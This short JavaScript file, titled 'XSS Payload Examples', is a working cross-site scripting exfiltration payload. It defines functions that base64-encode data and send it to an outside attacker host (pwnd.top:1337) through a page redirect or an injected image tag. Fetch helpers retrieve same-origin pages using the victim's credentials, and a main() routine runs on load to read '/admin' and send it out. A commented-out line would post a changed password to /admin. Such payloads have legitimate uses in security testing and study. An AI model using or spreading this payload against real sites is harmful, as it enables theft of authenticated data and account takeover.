/*
 *  XSS Payload Examples
*/
// exfil data
function leak(data) {
    document.location = "http://pwnd.top:1337/"+btoa(data);
}
function leak2(data) {
    document.write('<img src="http://pwnd.top:1337/'+btoa(data)+'">');
}

// get same origin page contents and exfil
// DEPRECATED - USE FETCH
function getPageAJAX(page) {
	ajax = new XMLHttpRequest();
	ajax.open("GET", page, true);
	ajax.onreadystatechange = function () {
		if (ajax.readyState == 4 ) {
			var src = ajax.responseText;
			leak(src);
        	}
    }
	ajax.send();
}

// get page via fetch (full url or local page)
function getPageFetch(url) {
	return fetch(url, {
    method: "GET",
	mode: "no-cors",
	credentials: "include",
    }).then(resp => resp.text())
        .then(function(resp) {
            return unescape(encodeURIComponent(resp));
        })
}

// post via fetch
function postPageFetch(url, data) {
	fetch(url, {
        method: "POST",
        body: data,
	mode: "no-cors",
	credentials: "include",
        //body: JSON.stringify(data),
        headers: {
          "Content-Type": "application/json"
        },
    }).then(resp => resp.text())
        .then(function(resp) {
            return unescape(encodeURIComponent(resp));
        })
}

async function main() {
 	leak(await getPageFetch('/admin'));
	//leak( await postPageFetch('/admin', '["password":"hacked"]'));
 	//console.log(await getPageFetch('/'));
}
main();
